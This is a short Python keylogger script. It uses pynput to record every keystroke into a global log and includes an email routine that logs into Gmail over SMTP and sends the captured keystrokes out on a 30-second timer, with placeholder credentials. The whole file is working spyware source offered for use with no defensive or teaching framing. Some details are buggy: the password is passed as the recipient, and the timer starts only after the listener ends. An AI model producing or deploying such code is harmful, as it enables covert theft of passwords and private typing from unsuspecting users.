import pynput.keyboard
import smtplib
import threading
#from pynput import keyboard

log = ""

def callback_function(key):
    #print(key) #will print which key has been just pressed on the keyboard
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += str(key)
    except:
        print("an error occurred")

    print(log)

# This part is optional in the event you want to send the captured text over email
# Feel free to use or comment this function
# Gmail configuration
def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, password, message)
    email_server.quit()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email("test@gmail.com", "yourpassword", log.encode('utf-8'))
    log = "" #emptying the content of the log variable
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

#threading
with keylogger_listener:
    keylogger_listener.join()
    thread_function()
